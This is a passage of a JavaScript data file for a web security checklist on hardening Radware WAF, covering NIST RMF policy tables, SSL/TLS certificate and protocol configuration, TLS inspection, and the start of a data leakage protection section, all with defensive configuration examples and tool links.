                            <td class="p-3 border">Impact analysis report, compliance verification results</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Testing</td>
                            <td class="p-3 border">CM-4(1), SA-11</td>
                            <td class="p-3 border">Non-production testing, false positive assessment</td>
                            <td class="p-3 border">Test results, performance impact assessment</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Approval</td>
                            <td class="p-3 border">CM-3, CA-6</td>
                            <td class="p-3 border">Formal approval process, security authorization</td>
                            <td class="p-3 border">Approval documentation, authorization decision</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Implementation</td>
                            <td class="p-3 border">CM-3(2), CM-5</td>
                            <td class="p-3 border">Controlled deployment, automated implementation</td>
                            <td class="p-3 border">Implementation plan, change records</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Monitoring</td>
                            <td class="p-3 border">CA-7, SI-4</td>
                            <td class="p-3 border">Effectiveness monitoring, performance tracking</td>
                            <td class="p-3 border">Monitoring reports, performance metrics</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Maintenance</td>
                            <td class="p-3 border">CM-3, SI-2</td>
                            <td class="p-3 border">Updates, tuning, adaptation to new threats</td>
                            <td class="p-3 border">Change records, justification documentation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Policy Retirement</td>
                            <td class="p-3 border">CM-3, CM-9</td>
                            <td class="p-3 border">Controlled decommissioning, replacement planning</td>
                            <td class="p-3 border">Retirement documentation, archive records</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST-Based Policy Documentation Requirements</h5>
                <p class="mb-4 text-gray-700">Essential documentation requirements for WAF policies per NIST guidelines:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Security Requirements:</strong> Detailed security requirements for each application</li>
                    <li class="mb-2"><strong>Risk Assessment:</strong> Analysis of threats, vulnerabilities, and impacts</li>
                    <li class="mb-2"><strong>Baseline Configuration:</strong> Documentation of the baseline security configuration</li>
                    <li class="mb-2"><strong>Policy Specifications:</strong> Detailed policy settings, rules, and parameters</li>
                    <li class="mb-2"><strong>Change Records:</strong> Documentation of all policy changes with justifications</li>
                    <li class="mb-2"><strong>Testing Results:</strong> Evidence of policy testing and validation</li>
                    <li class="mb-2"><strong>Approval Documentation:</strong> Records of policy reviews and approvals</li>
                    <li class="mb-2"><strong>Security Impact Analysis:</strong> Analysis of security impacts for policy changes</li>
                    <li class="mb-2"><strong>Exceptions Documentation:</strong> Detailed justification for any policy exceptions</li>
                </ul>
            `
        },
        {
            title: 'NIST Risk Management Framework for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Implement NIST Risk Management Framework (RMF) processes for comprehensive Radware WAF security.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure NIST RMF integration</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">risk-management</span></div>
                    <div><span class="code-param">framework</span> <span class="code-value">nist-rmf</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Step 1: Categorize the system</div>
                    <div><span class="code-command">categorization</span></div>
                    <div><span class="code-param">confidentiality</span> <span class="code-value">moderate</span></div>
                    <div><span class="code-param">integrity</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">availability</span> <span class="code-value">moderate</span></div>
                    <div class="code-comment"># Step 2: Select security controls</div>
                    <div><span class="code-command">control-selection</span></div>
                    <div><span class="code-param">baseline</span> <span class="code-value">moderate</span></div>
                    <div><span class="code-param">overlays</span> <span class="code-value">web-applications</span></div>
                    <div class="code-comment"># Step 3: Implement security controls</div>
                    <div><span class="code-command">implementation</span></div>
                    <div><span class="code-param">documentation-required</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">implementation-status-tracking</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Step 4: Assess security controls</div>
                    <div><span class="code-command">assessment</span></div>
                    <div><span class="code-param">assessment-procedures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">assessment-schedule</span> <span class="code-value">quarterly</span></div>
                    <div class="code-comment"># Step 5: Authorize the system</div>
                    <div><span class="code-command">authorization</span></div>
                    <div><span class="code-param">authorization-package</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">risk-acceptance-documentation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Step 6: Monitor security controls</div>
                    <div><span class="code-command">monitoring</span></div>
                    <div><span class="code-param">continuous-monitoring</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">control-status-reporting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">monitoring-frequency</span> <span class="code-value">ongoing</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">NIST RMF Steps for Radware WAF Implementation</h5>
                <p class="mb-4 text-gray-700">Detailed implementation of the six-step NIST Risk Management Framework for WAF:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">RMF Step</th>
                            <th class="p-3 border bg-gray-100">Key Activities</th>
                            <th class="p-3 border bg-gray-100">WAF-Specific Implementation</th>
                            <th class="p-3 border bg-gray-100">Outputs</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Step 1: Categorize</td>
                            <td class="p-3 border">Identify information types, determine impact levels</td>
                            <td class="p-3 border">Classify protected applications, API sensitivity analysis, data categorization</td>
                            <td class="p-3 border">Security categorization document, system boundary definition</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Step 2: Select</td>
                            <td class="p-3 border">Choose baseline controls, apply overlays, select enhancements</td>
                            <td class="p-3 border">Select appropriate WAF policy templates, customize security controls, apply web-specific overlays</td>
                            <td class="p-3 border">Security control selection document, tailoring justifications</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Step 3: Implement</td>
                            <td class="p-3 border">Deploy security controls, document implementation</td>
                            <td class="p-3 border">Configure WAF policies, deploy rules, implement protection mechanisms</td>
                            <td class="p-3 border">Implementation details, configuration documentation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Step 4: Assess</td>
                            <td class="p-3 border">Evaluate control effectiveness, determine risk</td>
                            <td class="p-3 border">Test WAF configuration, conduct penetration testing, validate protection</td>
                            <td class="p-3 border">Assessment results, findings documentation, remediation plans</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Step 5: Authorize</td>
                            <td class="p-3 border">Risk determination, authorization decision</td>
                            <td class="p-3 border">Document residual risk, obtain approval for WAF deployment</td>
                            <td class="p-3 border">Authorization package, risk acceptance documentation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Step 6: Monitor</td>
                            <td class="p-3 border">Ongoing assessment, status reporting</td>
                            <td class="p-3 border">Continuous WAF performance monitoring, security status tracking</td>
                            <td class="p-3 border">Monitoring reports, security status updates, improvement plans</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Key NIST RMF Documentation for WAF</h5>
                <p class="mb-4 text-gray-700">Essential documentation to maintain for RMF compliance:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>System Security Plan (SSP):</strong> Comprehensive documentation of all WAF security controls</li>
                    <li class="mb-2"><strong>Security Assessment Report (SAR):</strong> Results of WAF security control assessments</li>
                    <li class="mb-2"><strong>Plan of Action and Milestones (POA&M):</strong> Tracking of WAF security weaknesses and remediation</li>
                    <li class="mb-2"><strong>Security Control Traceability Matrix:</strong> Mapping of controls to implementation details</li>
                    <li class="mb-2"><strong>Risk Assessment Report:</strong> Analysis of threats, vulnerabilities, and impacts</li>
                    <li class="mb-2"><strong>Authorization Decision Document:</strong> Formal authorization with risk acceptance</li>
                    <li class="mb-2"><strong>Continuous Monitoring Strategy:</strong> Approach for ongoing security assessment</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'NIST Compliance Scanner for Radware',
            icon: 'fa-shield-alt',
            description: 'Tool for scanning Radware WAF configurations against NIST framework requirements.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'NIST Compliance Tools'
        },
        {
            title: 'Security Control Assessor',
            icon: 'fa-clipboard-check',
            description: 'Platform for assessing and documenting NIST 800-53 security control implementation.',
            link: 'https://csrc.nist.gov/projects/security-content-automation-protocol',
            linkText: 'SCAP Tools'
        },
        {
            title: 'NIST RMF Documentation Generator',
            icon: 'fa-file-alt',
            description: 'Tool for automatically generating RMF-compliant documentation for Radware WAF.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'RMF Documentation Tools'
        },
        {
            title: 'NIST Audit Log Analyzer',
            icon: 'fa-search',
            description: 'Tool for analyzing and reporting on security audit logs per NIST requirements.',
            link: 'https://www.splunk.com/en_us/software/enterprise-security.html',
            linkText: 'Splunk Enterprise Security'
        },
        {
            title: 'NIST CSF Assessment Tool',
            icon: 'fa-chart-bar',
            description: 'Interactive assessment tool to measure compliance with the NIST Cybersecurity Framework.',
            link: 'https://www.nist.gov/cyberframework',
            linkText: 'NIST CSF Resources'
        },
        {
            title: 'Policy Compliance Validator',
            icon: 'fa-tasks',
            description: 'Tool for validating Radware WAF policy compliance with NIST guidelines.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Policy Validation Tools'
        },
        {
            title: 'OSCAL Implementation Tool',
            icon: 'fa-code',
            description: 'Tool supporting Open Security Controls Assessment Language for NIST compliance.',
            link: 'https://pages.nist.gov/OSCAL/',
            linkText: 'OSCAL Resources'
        },
        {
            title: 'Continuous Monitoring Dashboard',
            icon: 'fa-tachometer-alt',
            description: 'Real-time monitoring of NIST security control status for Radware WAF.',
            link: 'https://www.radware.com/products/apsolute-vision/',
            linkText: 'Radware Vision'
        }
    ]
},







{
    id: 'ssl-tls-configuration',
    title: '13. SSL/TLS Configuration',
    subtitle: 'Secure communication setup and cryptographic settings for Radware WAF',
    icon: 'fa-lock',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '13.1 Certificate Management',
            icon: 'fa-certificate',
            items: [
                { id: '13.1.1', text: 'Configure SSL certificate installation and chain validation', priority: 'critical' },
                { id: '13.1.2', text: 'Set up certificate rotation and expiration monitoring', priority: 'high' },
                { id: '13.1.3', text: 'Implement certificate pinning for sensitive applications', priority: 'medium' },
                { id: '13.1.4', text: 'Configure OCSP stapling for certificate validation', priority: 'medium' },
                { id: '13.1.5', text: 'Set up mutual TLS (mTLS) for sensitive APIs', priority: 'high' },
                { id: '13.1.6', text: 'Configure wildcard and SAN certificate handling', priority: 'medium' },
                { id: '13.1.7', text: 'Implement certificate inventory management', priority: 'medium' },
                { id: '13.1.8', text: 'Set up automated certificate renewal processes', priority: 'high' }
            ]
        },
        {
            title: '13.2 Protocol Security',
            icon: 'fa-shield-alt',
            items: [
                { id: '13.2.1', text: 'Disable insecure SSL/TLS protocol versions', priority: 'critical' },
                { id: '13.2.2', text: 'Configure secure cipher suites and preferences', priority: 'critical' },
                { id: '13.2.3', text: 'Implement TLS 1.3 support for modern clients', priority: 'high' },
                { id: '13.2.4', text: 'Configure perfect forward secrecy (PFS)', priority: 'high' },
                { id: '13.2.5', text: 'Set up protocol downgrade attack protection', priority: 'high' },
                { id: '13.2.6', text: 'Implement HSTS (HTTP Strict Transport Security)', priority: 'high' },
                { id: '13.2.7', text: 'Configure secure renegotiation settings', priority: 'medium' },
                { id: '13.2.8', text: 'Set up TLS record size optimization', priority: 'medium' }
            ]
        },
        {
            title: '13.3 Encryption Management',
            icon: 'fa-key',
            items: [
                { id: '13.3.1', text: 'Configure hardware security module (HSM) integration', priority: 'high' },
                { id: '13.3.2', text: 'Set up key management and rotation policies', priority: 'high' },
                { id: '13.3.3', text: 'Implement secure key storage mechanisms', priority: 'critical' },
                { id: '13.3.4', text: 'Configure SSL/TLS session resumption settings', priority: 'medium' },
                { id: '13.3.5', text: 'Set up cipher suite transition planning', priority: 'medium' },
                { id: '13.3.6', text: 'Implement quantum-resistant algorithms (when available)', priority: 'low' },
                { id: '13.3.7', text: 'Configure cipher suite ordering preferences', priority: 'high' },
                { id: '13.3.8', text: 'Set up encryption performance optimization', priority: 'medium' }
            ]
        },
        {
            title: '13.4 SSL/TLS Inspection',
            icon: 'fa-search',
            items: [
                { id: '13.4.1', text: 'Configure SSL/TLS inspection capabilities', priority: 'critical' },
                { id: '13.4.2', text: 'Set up selective decryption based on categories', priority: 'high' },
                { id: '13.4.3', text: 'Implement privacy controls for sensitive data', priority: 'high' },
                { id: '13.4.4', text: 'Configure certificate validation during inspection', priority: 'high' },
                { id: '13.4.5', text: 'Set up SSL/TLS inspection bypass rules', priority: 'medium' },
                { id: '13.4.6', text: 'Implement performance optimization for inspection', priority: 'medium' },
                { id: '13.4.7', text: 'Configure logging for decrypted traffic', priority: 'high' },
                { id: '13.4.8', text: 'Set up re-encryption with secure parameters', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Secure Certificate Management for Radware WAF',
            content: `
                <p class="mb-4 text-gray-700">Configure secure certificate management for Radware WAF to ensure encrypted communications and establish trust.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SSL certificate management</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">ssl</span></div>
                    <div><span class="code-command">certificates</span></div>
                    <div class="code-comment"># Import a server certificate and private key</div>
                    <div><span class="code-command">import</span> <span class="code-param">cert-name</span> <span class="code-value">"app1.example.com"</span></div>
                    <div><span class="code-param">certificate-file</span> <span class="code-value">"/tmp/app1_cert.pem"</span></div>
                    <div><span class="code-param">key-file</span> <span class="code-value">"/tmp/app1_key.pem"</span></div>
                    <div><span class="code-param">passphrase</span> <span class="code-value">"SecurePassphrase"</span></div>
                    <div><span class="code-param">key-format</span> <span class="code-value">pem</span></div>
                    <div class="code-comment"># Import certificate chain</div>
                    <div><span class="code-command">import-chain</span> <span class="code-param">cert-name</span> <span class="code-value">"app1.example.com"</span></div>
                    <div><span class="code-param">chain-file</span> <span class="code-value">"/tmp/ca_chain.pem"</span></div>
                    <div class="code-comment"># Configure certificate monitoring</div>
                    <div><span class="code-command">monitoring</span></div>
                    <div><span class="code-param">expiration-alert</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">expiration-threshold</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">alert-recipients</span> <span class="code-value">security-team@example.com</span></div>
                    <div class="code-comment"># Configure mutual TLS</div>
                    <div><span class="code-command">mtls</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-ca-file</span> <span class="code-value">"/tmp/client_ca.pem"</span></div>
                    <div><span class="code-param">verify-depth</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">crl-checking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Certificate Types and Use Cases</h5>
                <p class="mb-4 text-gray-700">Different certificate types and their appropriate use with Radware WAF:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Certificate Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Best Use Case</th>
                            <th class="p-3 border bg-gray-100">Configuration Notes</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Standard SSL/TLS</td>
                            <td class="p-3 border">Single domain certificate</td>
                            <td class="p-3 border">Individual application protection</td>
                            <td class="p-3 border">Basic configuration, specific to one FQDN</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Wildcard</td>
                            <td class="p-3 border">Covers all subdomains (*.example.com)</td>
                            <td class="p-3 border">Multiple related applications</td>
                            <td class="p-3 border">Convenient but higher security impact if compromised</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SAN (Subject Alternative Name)</td>
                            <td class="p-3 border">Multiple specific domains in one certificate</td>
                            <td class="p-3 border">Multiple distinct applications</td>
                            <td class="p-3 border">Good balance of convenience and security isolation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">EV (Extended Validation)</td>
                            <td class="p-3 border">Highest level of organization validation</td>
                            <td class="p-3 border">Financial applications, secure portals</td>
                            <td class="p-3 border">Enhanced visual indicators in some browsers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Client Certificate</td>
                            <td class="p-3 border">Used for client authentication</td>
                            <td class="p-3 border">Mutual TLS implementations</td>
                            <td class="p-3 border">Requires client CA configuration and verification</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Certificate Management Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Private Key Security:</strong> Store private keys securely, preferably in a hardware security module (HSM)</li>
                    <li class="mb-2"><strong>Certificate Inventory:</strong> Maintain a complete inventory of all certificates with owners and expiration dates</li>
                    <li class="mb-2"><strong>Automated Renewal:</strong> Implement automated renewal processes to prevent unexpected expirations</li>
                    <li class="mb-2"><strong>Strong Key Sizes:</strong> Use RSA keys of at least 2048 bits or ECC keys of 256 bits or higher</li>
                    <li class="mb-2"><strong>Complete Chain:</strong> Always include the complete certificate chain to prevent trust issues</li>
                    <li class="mb-2"><strong>Regular Rotation:</strong> Rotate certificates annually or upon security events or staff changes</li>
                    <li class="mb-2"><strong>Revocation Checking:</strong> Implement OCSP or CRL checking for revocation status</li>
                </ul>
            `
        },
        {
            title: 'Secure Protocol Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure secure SSL/TLS protocol settings in Radware WAF to protect against protocol-level vulnerabilities.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SSL/TLS protocol security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">ssl</span></div>
                    <div><span class="code-command">protocols</span></div>
                    <div class="code-comment"># Disable insecure protocols</div>
                    <div><span class="code-param">sslv2</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">sslv3</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">tlsv1.0</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">tlsv1.1</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">tlsv1.2</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">tlsv1.3</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure cipher suites</div>
                    <div><span class="code-command">ciphers</span></div>
                    <div><span class="code-param">custom-list</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cipher-string</span> <span class="code-value">"ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"</span></div>
                    <div class="code-comment"># Configure HSTS</div>
                    <div><span class="code-command">hsts</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-age</span> <span class="code-value">31536000</span></div>
                    <div><span class="code-param">include-subdomains</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">preload</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure perfect forward secrecy</div>
                    <div><span class="code-param">prefer-pfs</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">dhparam-size</span> <span class="code-value">2048</span></div>
                    <div class="code-comment"># Configure anti-downgrade protection</div>
                    <div><span class="code-param">tls-fallback-scsv</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Protocol Security Best Practices</h5>
                <p class="mb-4 text-gray-700">Security recommendations for TLS protocol configuration in Radware WAF:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Category</th>
                            <th class="p-3 border bg-gray-100">Recommendation</th>
                            <th class="p-3 border bg-gray-100">Security Impact</th>
                            <th class="p-3 border bg-gray-100">Compatibility Impact</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Protocol Versions</td>
                            <td class="p-3 border">Enable only TLS 1.2 and 1.3</td>
                            <td class="p-3 border">High - Prevents numerous protocol vulnerabilities</td>
                            <td class="p-3 border">Medium - May affect older clients (pre-2016)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cipher Suites</td>
                            <td class="p-3 border">Use only AEAD ciphers with PFS</td>
                            <td class="p-3 border">High - Prevents numerous cryptographic attacks</td>
                            <td class="p-3 border">Medium - May affect older clients</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Key Exchange</td>
                            <td class="p-3 border">Use ECDHE or DHE with appropriate parameters</td>
                            <td class="p-3 border">High - Enables perfect forward secrecy</td>
                            <td class="p-3 border">Low - Well-supported in modern clients</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Certificate Types</td>
                            <td class="p-3 border">Use RSA-2048+ or ECDSA P-256/P-384</td>
                            <td class="p-3 border">Medium - Ensures adequate key strength</td>
                            <td class="p-3 border">Low - Well-supported in modern clients</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">HSTS</td>
                            <td class="p-3 border">Enable with appropriate max-age</td>
                            <td class="p-3 border">Medium - Prevents SSL stripping attacks</td>
                            <td class="p-3 border">Low - Well-supported in modern browsers</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Resumption</td>
                            <td class="p-3 border">Use tickets with appropriate rotation</td>
                            <td class="p-3 border">Low - Maintains security while improving performance</td>
                            <td class="p-3 border">None - Transparent to clients</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">TLS 1.3 Benefits and Implementation</h5>
                <p class="mb-4 text-gray-700">Advantages of implementing TLS 1.3 in Radware WAF:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Improved Performance:</strong> Reduced handshake latency (1-RTT, 0-RTT options)</li>
                    <li class="mb-2"><strong>Enhanced Security:</strong> Removal of legacy algorithms and vulnerable features</li>
                    <li class="mb-2"><strong>Simplified Configuration:</strong> Reduced cipher suite complexity and improved defaults</li>
                    <li class="mb-2"><strong>Perfect Forward Secrecy:</strong> Mandatory by default in all handshakes</li>
                    <li class="mb-2"><strong>Encrypted SNI (ESNI):</strong> Support for encrypted Server Name Indication for privacy</li>
                    <li class="mb-2"><strong>Certificate Privacy:</strong> Encryption of the certificate during the handshake</li>
                </ul>
            `
        },
        {
            title: 'SSL/TLS Inspection Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure SSL/TLS inspection capabilities in Radware WAF to detect threats in encrypted traffic.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SSL/TLS inspection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">ssl</span></div>
                    <div><span class="code-command">inspection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure inspection policies</div>
                    <div><span class="code-command">policy</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"standard-decryption"</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"standard-decryption"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Standard decryption policy for web applications"</span></div>
                    <div><span class="code-param">client-hello-inspection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">certificate-verification</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure category-based bypass</div>
                    <div><span class="code-command">bypass</span></div>
                    <div><span class="code-param">financial-services</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">healthcare</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">government</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure re-encryption settings</div>
                    <div><span class="code-command">re-encryption</span></div>
                    <div><span class="code-param">preserve-server-cipher</span> <span class="code-value">disable</span></div>
                    <div><span class="code-param">minimum-protocol</span> <span class="code-value">tlsv1.2</span></div>
                    <div><span class="code-param">preferred-ciphers</span> <span class="code-value">"ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256"</span></div>
                    <div class="code-comment"># Configure inspection performance</div>
                    <div><span class="code-command">performance</span></div>
                    <div><span class="code-param">hardware-acceleration</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">session-cache</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">session-cache-size</span> <span class="code-value">10000</span></div>
                    <div><span class="code-param">session-cache-timeout</span> <span class="code-value">3600</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">SSL/TLS Inspection Considerations</h5>
                <p class="mb-4 text-gray-700">Important factors to consider when implementing SSL/TLS inspection:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Consideration</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Recommendation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Privacy</td>
                            <td class="p-3 border">Decryption may expose sensitive user data</td>
                            <td class="p-3 border">Implement category-based bypasses for sensitive sites (financial, healthcare)</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Legal Compliance</td>
                            <td class="p-3 border">Inspection may be subject to regulatory requirements</td>
                            <td class="p-3 border">Consult legal counsel and ensure proper notices to users</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Certificate Validation</td>
                            <td class="p-3 border">Proper validation of server certificates</td>
                            <td class="p-3 border">Enable rigorous certificate validation to prevent MITM attacks</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Performance Impact</td>
                            <td class="p-3 border">Decryption and re-encryption require resources</td>
                            <td class="p-3 border">Use hardware acceleration and selective decryption</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Certificate Pinning</td>
                            <td class="p-3 border">Some applications use certificate pinning</td>
                            <td class="p-3 border">Create bypass rules for applications using certificate pinning</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Perfect Forward Secrecy</td>
                            <td class="p-3 border">PFS ciphers require more resources</td>
                            <td class="p-3 border">Balance security and performance with appropriate hardware</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Selective Decryption Strategy</h5>
                <p class="mb-4 text-gray-700">Strategic approach to selective SSL/TLS inspection:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Risk-Based Approach:</strong> Focus decryption on higher-risk traffic and applications</li>
                    <li class="mb-2"><strong>Category-Based Bypasses:</strong> Create exemptions for sensitive categories (financial, healthcare)</li>
                    <li class="mb-2"><strong>Application Intelligence:</strong> Use application identification to target specific protocols</li>
                    <li class="mb-2"><strong>User-Based Policies:</strong> Apply different inspection levels based on user groups</li>
                    <li class="mb-2"><strong>Destination Reputation:</strong> Consider destination reputation for inspection decisions</li>
                    <li class="mb-2"><strong>Traffic Volume:</strong> Consider selective sampling for very high-volume streams</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'SSL/TLS Configuration Analyzer',
            icon: 'fa-search',
            description: 'Tool for analyzing and optimizing SSL/TLS configurations in Radware WAF.',
            link: 'https://www.ssllabs.com/ssltest/',
            linkText: 'SSL Labs'
        },
        {
            title: 'Certificate Management System',
            icon: 'fa-certificate',
            description: 'Centralized system for managing SSL/TLS certificates across WAF deployments.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Certificate Tools'
        },
        {
            title: 'Protocol Compliance Scanner',
            icon: 'fa-shield-alt',
            description: 'Tool for verifying SSL/TLS protocol security and compliance with standards.',
            link: 'https://github.com/drwetter/testssl.sh',
            linkText: 'testssl.sh'
        },
        {
            title: 'HSM Integration Module',
            icon: 'fa-key',
            description: 'Module for integrating hardware security modules with Radware WAF.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'HSM Integration'
        },
        {
            title: 'SSL Performance Optimizer',
            icon: 'fa-tachometer-alt',
            description: 'Tool for optimizing SSL/TLS performance in high-traffic environments.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Performance Tools'
        },
        {
            title: 'TLS 1.3 Compatibility Tester',
            icon: 'fa-check-circle',
            description: 'Tool for testing TLS 1.3 compatibility with various clients and browsers.',
            link: 'https://www.cdn77.com/tls-test',
            linkText: 'TLS Test'
        }
    ]
},
{
    id: 'data-leakage-protection',
    title: '14. Data Leakage Protection',
    subtitle: 'Preventing sensitive information exposure and data exfiltration through Radware WAF',
    icon: 'fa-user-secret',
    priority: 'high',
    progress: 0,
    checklist: [
        {
            title: '14.1 Sensitive Data Detection',
            icon: 'fa-search',
            items: [
                { id: '14.1.1', text: 'Configure PII detection patterns (SSN, credit cards, etc.)', priority: 'critical' },
                { id: '14.1.2', text: 'Set up custom data patterns for organization-specific information', priority: 'high' },
                { id: '14.1.3', text: 'Implement regex-based data identification', priority: 'high' },
                { id: '14.1.4', text: 'Configure healthcare data (PHI) detection', priority: 'high' },
                { id: '14.1.5', text: 'Set up financial data detection patterns', priority: 'high' },
                { id: '14.1.6', text: 'Implement governmental data identification', priority: 'medium' },
                { id: '14.1.7', text: 'Configure intellectual property protection patterns', priority: 'medium' },
                { id: '14.1.8', text: 'Set up detection thresholds and accuracy levels', priority: 'high' }
            ]
        },
        {
            title: '14.2 Response Control Mechanisms',
            icon: 'fa-filter',
            items: [
